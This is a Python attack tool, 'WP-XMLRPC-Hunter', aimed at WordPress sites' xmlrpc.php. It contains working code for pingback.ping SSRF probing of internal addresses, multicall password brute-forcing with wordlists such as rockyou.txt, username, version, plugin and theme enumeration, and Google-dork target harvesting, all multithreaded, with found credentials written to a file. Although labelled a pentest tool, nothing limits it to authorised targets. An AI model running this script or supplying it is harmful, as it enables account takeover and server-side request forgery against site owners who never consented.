#!/usr/bin/env python3

import requests
import argparse
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
from threading import Thread
from queue import Queue
from googlesearch import search
import re
import os
import glob
import time

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def print_banner():
    print(r"""
███╗   ██╗  ██████╗  ██████╗  ███████╗ ███████╗
████╗  ██║ ██╔═══██╗ ██╔══██╗ ██╔════╝      ██║
██╔██╗ ██║ ██║   ██║ ██║  ██║ ███████╗      ██║
██║╚██╗██║ ██║   ██║ ██║  ██║ ██╔════╝      ██║
██║ ╚████║  ╚██████╔╝ ██████╔╝ ███████╗      ██║

                  node7 by c@sper
     WP-XMLRPC-Hunter - Pentest Edition
""")

def check_xmlrpc(url):
    """
    Check if xmlrpc.php is enabled and responding.
    """
    xmlrpc_url = urljoin(url, 'xmlrpc.php')
    headers = {'Content-Type': 'text/xml'}
    payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>system.listMethods</methodName>
    </methodCall>"""

    try:
        r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=10, verify=False)
        # If system.listMethods is in response, XML-RPC is likely enabled.
        if "system.listMethods" in r.text:
            print(f"[+] XML-RPC enabled: {xmlrpc_url}")
            return True
    except Exception:
        pass

    print(f"[-] XML-RPC not available on {url}")
    return False

def send_pingback(victim_url, target_url):
    """
    Attempt SSRF by sending a pingback request from the victim_url to target_url.
    """
    xmlrpc_url = urljoin(victim_url, 'xmlrpc.php')
    payload = f"""<?xml version="1.0"?>
    <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
            <param><value><string>{target_url}</string></value></param>
            <param><value><string>{victim_url}</string></value></param>
        </params>
    </methodCall>"""
    headers = {'Content-Type': 'text/xml'}

    try:
        r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=10, verify=False)
        if "faultString" in r.text:
            print(f"[!] SSRF attempt: {target_url} → {victim_url} | Response: {r.status_code}")
            return True
    except Exception as e:
        print(f"[!] Error pinging {target_url} → {victim_url}: {e}")
    return False

def xmlrpc_bruteforce(url, users, passwords):
    """
    Bruteforce credentials via the XML-RPC system.multicall method.
    Attempts multiple username/password combos in a single request for efficiency.
    """
    xmlrpc_url = urljoin(url, 'xmlrpc.php')
    headers = {'Content-Type': 'text/xml'}
    valid_creds = []
    print(f"[~] Starting brute-force on {xmlrpc_url}")

    for user in users:
        # Build multiple method calls for each password
        methods = ""
        for pwd in passwords:
            methods += f"""
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value><string>{user}</string></value></param>
                    <param><value><string>{pwd}</string></value></param>
                </params>
            </methodCall>"""

        multicall = f"""<?xml version="1.0"?>
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param>
                    <value>
                        <array><data>{methods}</data></array>
                    </value>
                </param>
            </params>
        </methodCall>"""

        try:
            r = requests.post(xmlrpc_url, data=multicall, headers=headers, timeout=15, verify=False)
            # If either an isAdmin or <member> structure is in the response, the combo might be valid.
            if "<name>isAdmin</name>" in r.text or "<member>" in r.text:
                # Check for which password(s) triggered it
                # We do a second pass or parse the response in detail to identify *exactly* which credentials worked
                # However, for brevity, we’ll just assume one of them is valid.
                # In practice, you'd parse the response carefully to find each valid combo.
                for line_pwd in passwords:
                    if f"<string>{user}</string>" in r.text and f"<string>{line_pwd}</string>" in r.text:
                        print(f"[+] Valid creds: {user}:{line_pwd}")
                        valid_creds.append((user, line_pwd))
            # A small delay can help avoid getting blocked
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error: {e}")

    return valid_creds

def dork_search(query, limit=10):
    """
    Use Google Dorks to find potentially vulnerable targets (requires `googlesearch`).
    """
    print(f"[~] Running dork: {query}")
    found_urls = []
    try:
        for result in search(query, num_results=limit):
            print(f"[+] Dork result: {result}")
            found_urls.append(result)
    except Exception as e:
        print(f"[!] Error during dorking: {e}")
    return found_urls

def passive_scan(url):
    """
    Basic detection of WordPress footprints and possible enumerations
    from the homepage (like /wp-content or basic username patterns).
    """
    print(f"[~] Passive recon on {url}")
    try:
        r = requests.get(url, timeout=10, verify=False)
        if "wp-content" in r.text:
            print("[+] Detected 'wp-content' references (WordPress likely in use).")
        # Very naive author enumeration.
        # More thorough approaches might test /?author=1, etc.
        match_users = re.findall(r"/author/([\w-]+)", r.text)
        if match_users:
            users = set(match_users)
            for u in users:
                print(f"[+] Potential username found: {u}")
        # Check for readme.html
        readme_url = urljoin(url, "readme.html")
        try:
            r2 = requests.get(readme_url, timeout=5, verify=False)
            if r2.status_code == 200 and "WordPress" in r2.text:
                print("[+] Found readme.html (exposed WP readme).")
        except Exception:
            pass
    except Exception as e:
        print(f"[!] Passive scan error: {e}")

def detect_wp_version(url):
    """
    Attempt to detect the WordPress version by:
    1. Checking the Generator meta tag in HTML.
    2. Checking readme.html for WP version references.
    """
    version_found = None
    try:
        r = requests.get(url, timeout=10, verify=False)
        meta_match = re.search(r'<meta name="generator" content="WordPress ([\d\.]+)"', r.text, re.IGNORECASE)
        if meta_match:
            version_found = meta_match.group(1)
            print(f"[+] Found WP version (meta generator): {version_found}")

        # If not found, try readme.html
        if not version_found:
            readme_url = urljoin(url, "readme.html")
            r2 = requests.get(readme_url, timeout=5, verify=False)
            # Typically readme.html contains a line like "WordPress x.x.x"
            readme_match = re.search(r"WordPress\s+([\d\.]+)", r2.text, re.IGNORECASE)
            if readme_match:
                version_found = readme_match.group(1)
                print(f"[+] Found WP version (readme.html): {version_found}")
    except Exception as e:
        print(f"[!] Version detection error: {e}")

    if not version_found:
        print("[-] WP version not detected.")
    return version_found

def enum_plugins(url):
    """
    Attempt to identify active plugins by requesting common plugin file paths.
    In practice, you might want to expand this list or load from a file.
    """
    common_plugins = [
        "wp-content/plugins/akismet/readme.txt",
        "wp-content/plugins/hello.php",
        "wp-content/plugins/contact-form-7/readme.txt",
    ]
    print(f"[~] Enumerating plugins on {url}")
    for plugin_path in common_plugins:
        full_url = urljoin(url, plugin_path)
        try:
            r = requests.get(full_url, timeout=5, verify=False)
            if r.status_code == 200:
                print(f"[+] Plugin detected: {plugin_path}")
        except Exception as e:
            pass

def enum_themes(url):
    """
    Attempt to identify active themes by checking style.css or readme files
    in common theme directories.
    """
    common_themes = [
        "wp-content/themes/twentytwentyone/style.css",
        "wp-content/themes/twentytwentytwo/style.css",
        "wp-content/themes/twentynineteen/style.css",
    ]
    print(f"[~] Enumerating themes on {url}")
    for theme_path in common_themes:
        full_url = urljoin(url, theme_path)
        try:
            r = requests.get(full_url, timeout=5, verify=False)
            if r.status_code == 200:
                print(f"[+] Theme detected: {theme_path}")
        except Exception as e:
            pass

def smart_mode(url, args, results):
    """
    'Smart mode' attempts a broad pentest approach:
    - Check XML-RPC
    - Passive fingerprinting
    - Version detection
    - Attempt SSRF (pingback)
    - Brute-force (if user/pass provided)
    - Plugin/Theme enumeration (if flags are set)
    """
    print(f"[~] Running SMART mode on {url}")
    if check_xmlrpc(url):
        passive_scan(url)
        detect_wp_version(url)
        if args.enum_plugins:
            enum_plugins(url)
        if args.enum_themes:
            enum_themes(url)

        # Attempt default SSRF
        send_pingback(url, urljoin(url, '/'))

        if args.userlist and args.passlist:
            users = open(args.userlist).read().splitlines()
            passwords = open(args.passlist).read().splitlines()
            creds = xmlrpc_bruteforce(url, users, passwords)
            results.extend([(url, u, p) for u, p in creds])

def autofill_wordlists(args):
    """
    Attempt to autofill userlist and passlist from known paths if not supplied.
    """
    if not args.userlist:
        found_users = glob.glob(os.path.expanduser("~/SecLists/Usernames/*.txt"))
        if found_users:
            args.userlist = found_users[0]
            print(f"[~] Auto-filled userlist: {args.userlist}")
    if not args.passlist:
        # Common location for rockyou.txt (if present).
        if os.path.exists(os.path.expanduser("~/rockyou.txt")):
            args.passlist = os.path.expanduser("~/rockyou.txt")
            print(f"[~] Auto-filled passlist: {args.passlist}")

def thread_worker(queue, args, results):
    """
    Worker thread function:
    - Fetch URLs from the queue
    - Run the specified modes/features
    - Store any valid creds in the results list
    """
    while not queue.empty():
        url = queue.get()
        url = url.strip()

        if args.smart_mode:
            smart_mode(url, args, results)
        else:
            # Check if XML-RPC is available
            if check_xmlrpc(url):
                # Check SSRF / pingback
                if args.pingback:
                    if args.ssrf_target:
                        send_pingback(url, args.ssrf_target)
                    elif args.ssrf_scan:
                        with open(args.ssrf_scan) as f:
                            for line in f:
                                target = line.strip()
                                if target:
                                    send_pingback(url, target)
                    else:
                        send_pingback(url, urljoin(url, '/'))

                # Bruteforce
                if args.bruteforce:
                    users = open(args.userlist).read().splitlines()
                    passwords = open(args.passlist).read().splitlines()
                    creds = xmlrpc_bruteforce(url, users, passwords)
                    results.extend([(url, u, p) for u, p in creds])

                # Basic passive scanning
                if args.scan_public:
                    passive_scan(url)
                if args.detect_version:
                    detect_wp_version(url)
                if args.enum_plugins:
                    enum_plugins(url)
                if args.enum_themes:
                    enum_themes(url)

        queue.task_done()

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="node7 | WP-XMLRPC-Hunter | A beefed-up WordPress pentest tool"
    )
    parser.add_argument("-u", "--url", help="Single target URL (e.g., https://site.com)")
    parser.add_argument("-t", "--targets", help="File with list of target URLs (one per line)")
    parser.add_argument("--pingback", action="store_true", help="Test for SSRF using pingback.ping")

    parser.add_argument("--bruteforce", action="store_true", help="Enable XML-RPC multicall brute-force")
    parser.add_argument("--userlist", help="Username wordlist (autofills if missing)")
    parser.add_argument("--passlist", help="Password wordlist (autofills if missing)")

    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("-o", "--output", help="Output file for valid credentials")

    parser.add_argument("--dork", nargs="?", const='inurl:"/xmlrpc.php?rsd" ext:php',
                        help="Run Google Dork to find targets (default dork: inurl:\"/xmlrpc.php?rsd\" ext:php)")
    parser.add_argument("--dork-limit", type=int, default=10, help="Limit number of dork results (default: 10)")

    parser.add_argument("--ssrf-target", help="Custom URL/IP to use for SSRF via pingback.ping")
    parser.add_argument("--ssrf-scan", help="File with list of internal URLs/IPs to test for SSRF")

    parser.add_argument("--scan-public", action="store_true", help="Scan for publicly exposed data (usernames, readme, etc.)")
    parser.add_argument("--detect-version", action="store_true", help="Attempt to detect WP version via meta/readme.html")
    parser.add_argument("--enum-plugins", action="store_true", help="Enumerate common plugins")
    parser.add_argument("--enum-themes", action="store_true", help="Enumerate common themes")

    parser.add_argument("--smart-mode", action="store_true",
                        help="Run full recon, version detection, plugin/theme enumeration, brute-force, SSRF in one go")

    args = parser.parse_args()

    # Attempt to automatically fill user/pass lists if needed
    autofill_wordlists(args)

    # If brute-forcing, confirm that user/pass lists exist
    if args.bruteforce:
        if not args.userlist or not args.passlist:
            print("[!] --bruteforce requires --userlist and --passlist.")
            return

    # Collect targets
    targets = []
    if args.dork:
        targets += dork_search(args.dork, args.dork_limit)
    if args.url:
        targets.append(args.url)
    if args.targets:
        with open(args.targets) as f:
            targets += [line.strip() for line in f if line.strip()]

    # Ensure we have something to scan
    if not targets:
        print("[!] No targets specified. Use -u, -t, or --dork.")
        return

    # Prepare multithreading
    queue = Queue()
    results = []

    for url in targets:
        queue.put(url)

    thread_list = []
    for _ in range(args.threads):
        t = Thread(target=thread_worker, args=(queue, args, results))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    # Output valid creds if found
    if args.output and results:
        with open(args.output, "w") as out:
            for url, user, pwd in results:
                out.write(f"{url} - {user}:{pwd}\n")
        print(f"[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()
